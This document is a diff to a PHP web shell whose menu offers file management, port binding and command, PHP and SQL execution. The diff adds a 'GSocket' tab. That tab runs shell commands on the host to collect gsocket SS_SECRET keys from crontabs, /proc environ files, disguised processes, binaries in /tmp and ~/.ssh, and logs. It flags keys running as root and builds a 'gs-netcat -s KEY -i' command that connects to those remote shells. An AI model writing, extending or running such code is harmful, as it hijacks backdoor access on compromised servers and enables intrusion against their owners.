@@ -434,7 +434,7 @@ if (isset($issql)) {
 }
 ?>
 </div><?php 
-$menu = array('file' => 'File Mgr', 'scan' => 'Searcher', 'antivirus' => 'Antivirus', 'backshell' => 'Bind Port', 'exec' => 'Exec CMD', 'phpeval' => 'Exec PHP', 'sql' => 'Exec SQL', 'info' => 'System');
+$menu = array('file' => 'File Mgr', 'scan' => 'Searcher', 'antivirus' => 'Antivirus', 'backshell' => 'Bind Port', 'exec' => 'Exec CMD', 'phpeval' => 'Exec PHP', 'sql' => 'Exec SQL', 'info' => 'System', 'gsocket' => 'GSocket');
 $go = array_key_exists($_POST['go'], $menu) ? $_POST['go'] : 'file';
 $nowdir = isset($_POST['dir']) ? strdir(chop($_POST['dir']) . '/') : THISDIR;
 echo '<div class="tag">';
@@ -1113,6 +1113,185 @@ switch ($_POST['go']) {
         echo '<input type="button" value="Perm" style="width:50px;" onclick=\'txts("Change Permission","0666","c");\'> ';
         echo '<input type="button" value="Time" style="width:50px;" onclick=\'txts("Change the time","' . $mtime . '","d");\'> ';
         echo 'Total dir[' . $dnum . '] - Total file[' . $fnum . '] - Permission[' . $chmod . ']</div></form>';
+        break;
+    case "gsocket":
+        if ($win) {
+            echo '<div class="msgbox"><h1>GSocket key scanner is not available on Windows.</h1></div>';
+            break;
+        }
+        $gsr = function($cmd) {
+            $r = command($cmd . ' 2>/dev/null', THISDIR);
+            return trim((string)$r['res']);
+        };
+        $gs_pu = function($pid) use ($gsr) {
+            if (!$pid || !ctype_digit((string)$pid)) return '?';
+            $u = $gsr('ps -o user= -p ' . (int)$pid);
+            if ($u && strlen($u) < 64 && strpos($u, ' ') === false) return $u;
+            $uid = $gsr("awk '/^Uid:/{print \$2}' /proc/" . (int)$pid . '/status');
+            if (!ctype_digit((string)$uid)) return '?';
+            return $gsr("getent passwd $uid | cut -d: -f1") ?: "uid:$uid";
+        };
+        $rescan  = isset($_POST['gs_rescan']);
+        $do_cron = !$rescan || isset($_POST['gs_cron']);
+        $do_proc = !$rescan || isset($_POST['gs_proc']);
+        $do_env  = !$rescan || isset($_POST['gs_env']);
+        $do_disk = !$rescan || isset($_POST['gs_disk']);
+        $do_log  = !$rescan || isset($_POST['gs_log']);
+        $gres = array(); $gseen = array();
+        $gsme   = $gsr('whoami') ?: 'www-data';
+        $gshome = $gsr('echo ~');
+        // 1. Crontab
+        if ($do_cron) {
+            $cout = $gsr('crontab -l');
+            if (preg_match_all('/-s\s+(\S+)/', $cout, $cm)) {
+                foreach ($cm[1] as $k) {
+                    if (!isset($gseen[$k])) { $gseen[$k]=1; $gres[]=array('src'=>'crontab','key'=>$k,'user'=>$gsme,'detail'=>'crontab -l','pid'=>''); }
+                }
+            }
+            foreach (array('/var/spool/cron/crontabs', '/var/spool/cron') as $cd) {
+                foreach ((glob("$cd/*") ?: array()) as $cf) {
+                    if (!is_file($cf) || !is_readable($cf)) continue;
+                    $cu = basename($cf); $cc = @file_get_contents($cf);
+                    if ($cc && preg_match_all('/-s\s+(\S+)/', $cc, $cm2)) {
+                        foreach ($cm2[1] as $k) {
+                            if (!isset($gseen[$k])) { $gseen[$k]=1; $gres[]=array('src'=>'crontab','key'=>$k,'user'=>$cu,'detail'=>$cf,'pid'=>''); }
+                        }
+                    }
+                }
+            }
+        }
+        // 2. Process list (hidden gsocket process names)
+        if ($do_proc) {
+            $pg = $gsr("pgrep -a -E 'kstrp|watchdogd|ksmd|kswapd0|mm_percpu_wq|id_rsa'");
+            foreach (explode("\n", $pg) as $line) {
+                $line = trim($line); if (!$line) continue;
+                $p = explode(' ', $line, 2); $pid = $p[0];
+                if (!ctype_digit($pid)) continue;
+                $k = $gsr("tr '\\000' '\\n' < /proc/$pid/environ | grep -oP 'SS_SECRET=\\K\\S+'");
+                if (!$k || isset($gseen[$k])) continue;
+                $gseen[$k]=1; $pname = isset($p[1]) ? $p[1] : '';
+                $gres[]=array('src'=>'process','key'=>$k,'user'=>$gs_pu($pid),'detail'=>"PID $pid - $pname",'pid'=>$pid);
+            }
+        }
+        // 3. /proc/environ scan
+        if ($do_env) {
+            $rl = $gsr("grep -rl 'SS_SECRET' /proc/*/environ");
+            foreach (explode("\n", $rl) as $ef) {
+                $ef = trim($ef);
+                if (!preg_match('#/proc/(\d+)/environ#', $ef, $epm)) continue;
+                $pid = $epm[1];
+                $k = $gsr("tr '\\000' '\\n' < /proc/$pid/environ | grep -oP 'SS_SECRET=\\K\\S+'");
+                if (!$k || isset($gseen[$k])) continue;
+                $gseen[$k]=1;
+                $gres[]=array('src'=>'/proc/env','key'=>$k,'user'=>$gs_pu($pid),'detail'=>"PID $pid",'pid'=>$pid);
+            }
+        }
+        // 4. Disk binary
+        if ($do_disk) {
+            $ssh = escapeshellarg("$gshome/.ssh");
+            $fd = $gsr("find /tmp /dev/shm /var/tmp $ssh -maxdepth 3 \\( -name 'defunct' -o -name '.gs' -o -name 'gs-netcat' -o -name 'id_rsa' \\) -type f");
+            foreach (explode("\n", $fd) as $fp) {
+                $fp = trim($fp); if (!$fp || !file_exists($fp)) continue;
+                $k = $gsr('strings ' . escapeshellarg($fp) . " | grep -oP '(?<=-s )\\S+' | head -1");
+                if (!$k || isset($gseen[$k])) continue;
+                $owner = $gsr("stat -c '%U' " . escapeshellarg($fp));
+                $pid   = $gsr('pgrep -f ' . escapeshellarg(basename($fp)) . ' | head -1');
+                $ru    = ($pid && ctype_digit($pid)) ? $gs_pu($pid) : ($owner ?: '?');
+                $gseen[$k]=1;
+                $gres[]=array('src'=>'disk','key'=>$k,'user'=>$ru,'detail'=>$fp.($pid?" (PID $pid)":''),'pid'=>($pid ?: ''));
+            }
+        }
+        // 5. Log files
+        if ($do_log) {
+            foreach (array('/tmp/.gs_install.log','/tmp/.gs_py.log','/tmp/.gs.log',"$gshome/.gs_session.log") as $lf) {
+                if (!@file_exists($lf) || !is_readable($lf)) continue;
+                $lc = @file_get_contents($lf); if (!$lc) continue;
+                $owner = $gsr("stat -c '%U' " . escapeshellarg($lf));
+                preg_match_all('/(?:gs-netcat -s "([^"]+)"|SS_SECRET=(\S+))/', $lc, $lm);
+                foreach (array_filter(array_merge($lm[1], $lm[2])) as $k) {
+                    if (!isset($gseen[$k])) { $gseen[$k]=1; $gres[]=array('src'=>'logs','key'=>$k,'user'=>($owner ?: '?'),'detail'=>$lf,'pid'=>''); }
+                }
+            }
+        }
+        // Liveness check
+        foreach ($gres as &$gr) {
+            if (!$gr['key']) { $gr['live']=false; continue; }
+            if ($gr['pid'] && ctype_digit((string)$gr['pid'])) {
+                $gr['live'] = file_exists('/proc/' . (int)$gr['pid']);
+            } else {
+                $fl = $gsr('grep -rl ' . escapeshellarg('SS_SECRET='.$gr['key']) . ' /proc/*/environ');
+                preg_match('#/proc/(\d+)/environ#', $fl, $lpm);
+                $fpid = isset($lpm[1]) ? $lpm[1] : '';
+                $gr['live'] = ($fpid && file_exists('/proc/' . (int)$fpid));
+                if ($fpid) $gr['pid'] = $fpid;
+            }
+        }
+        unset($gr);
+        // Stats
+        $gnk = count(array_filter($gres, function($r){ return (bool)$r['key']; }));
+        $gnr = count(array_filter($gres, function($r){ return $r['user']==='root' && $r['key']; }));
+        $gnl = count(array_filter($gres, function($r){ return $r['live']; }));
+        // Status bar
+        $gsm = 'Scan complete &mdash; <b>' . $gnk . ' key' . ($gnk!=1?'s':'') . ' found</b> (' . $gnl . ' live)';
+        if ($gnr) $gsm .= ' &nbsp;|&nbsp; <span style="color:#CC0000;font-weight:bold;">&#9888; ' . $gnr . ' running as ROOT</span>';
+        echo '<div class="msgbox">' . $gsm . '</div>';
+        // Re-scan form
+        echo '<form method="POST">'; subeval();
+        echo '<input type="hidden" name="go" value="gsocket">';
+        echo '<input type="hidden" name="gs_rescan" value="1">';
+        echo '<div class="actall">Sources:&nbsp; ';
+        $gschk = function($n,$l,$i) use ($rescan) {
+            $c = (!$rescan || isset($_POST[$n])) ? ' checked' : '';
+            echo "<input type='checkbox' name='$n' id='$i'$c> <label for='$i'>$l</label> &nbsp;";
+        };
+        $gschk('gs_cron','Crontab','gck1'); $gschk('gs_proc','Process list','gck2');
+        $gschk('gs_env','/proc/environ','gck3'); $gschk('gs_disk','Disk binary','gck4');
+        $gschk('gs_log','Log files','gck5');
+        echo '&nbsp;<input type="submit" value="Scan All" style="width:68px"></div></form>';
+        // Results table
+        if (!$gnk) {
+            echo '<div class="actall">No gsocket keys found.</div>';
+        } else {
+            $gsc = array(
+                'crontab'   => 'background:#FFF3CC;color:#8B6000;border:1px solid #CCAA00',
+                '/proc/env' => 'background:#CCF0FF;color:#004080;border:1px solid #0080CC',
+                'process'   => 'background:#E8F4E8;color:#006000;border:1px solid #00A000',
+                'disk'      => 'background:#CCE8FF;color:#003070;border:1px solid #0060BB',
+                'logs'      => 'background:#EEEEEE;color:#555;border:1px solid #999',
+            );
+            echo '<table class="tables"><tr>';
+            echo '<th style="width:22px;">#</th><th style="width:82px;">Source</th><th>SS_SECRET key</th>';
+            echo '<th style="width:72px;">User</th><th style="width:175px;">Binary / PID</th>';
+            echo '<th style="width:55px;">Status</th><th style="width:92px;">Action</th></tr>';
+            $gn = 0;
+            foreach ($gres as $gr) {
+                if (!$gr['key']) continue; $gn++;
+                $ir = ($gr['user'] === 'root');
+                $ss = isset($gsc[$gr['src']]) ? $gsc[$gr['src']] : '';
+                $sh = '<span style="display:inline-block;padding:1px 5px;font-size:11px;font-weight:bold;font-family:\'Courier New\',monospace;' . $ss . '">' . htmlspecialchars($gr['src']) . '</span>';
+                $uh = $ir ? '<span style="color:#CC0000;font-weight:bold;font-family:\'Courier New\',monospace;">&#9888; root</span>' : '<code style="font-size:11px;">' . htmlspecialchars($gr['user']) . '</code>';
+                $kh = $gr['live'] ? '<code>' . htmlspecialchars($gr['key']) . '</code>' : '<code><s>' . htmlspecialchars($gr['key']) . '</s></code>';
+                $lh = $gr['live'] ? '<span style="color:#008B00;font-weight:bold;">&#9679; Live</span>' : '<span style="color:#CC0000;font-weight:bold;">&#10005; Stale</span>';
+                $rb = $ir ? ' style="background:#FFE0E0;"' : '';
+                $ke = addslashes($gr['key']);
+                echo "<tr$rb><td>$gn</td><td>$sh</td><td>$kh</td><td>$uh</td>";
+                echo '<td><code style="font-size:11px;">' . htmlspecialchars($gr['detail']) . '</code></td>';
+                echo "<td>$lh</td><td>";
+                echo "<input type='button' value='Copy' style='width:36px' onclick=\"gscp('$ke')\">";
+                if ($gr['live']) echo " <input type='button' value='CMD' style='width:36px' onclick=\"gscmd('$ke')\">";
+                echo '</td></tr>';
+            }
+            echo '</table>';
+        }
+        // Connect command bar
+        echo '<div id="gs_cmdbar" style="display:none;" class="actall"><b>Connect command:</b> &nbsp;';
+        echo '<code id="gs_cmd" style="font-family:\'Courier New\',monospace;background:#F0F0F0;border:1px solid #999;padding:2px 6px;"></code>';
+        echo ' &nbsp;<input type="button" value="Copy CMD" style="width:72px" onclick="gscp(document.getElementById(\'gs_cmd\').textContent)"></div>';
+        // JS helpers
+        echo '<script>';
+        echo 'function gscp(k){if(navigator.clipboard)navigator.clipboard.writeText(k);}';
+        echo 'function gscmd(k){var b=document.getElementById("gs_cmdbar"),c=document.getElementById("gs_cmd");c.textContent=\'gs-netcat -s "\'+k+\'" -i\';b.style.display="block";}';
+        echo '</script>';
         break;
 }
 ?>
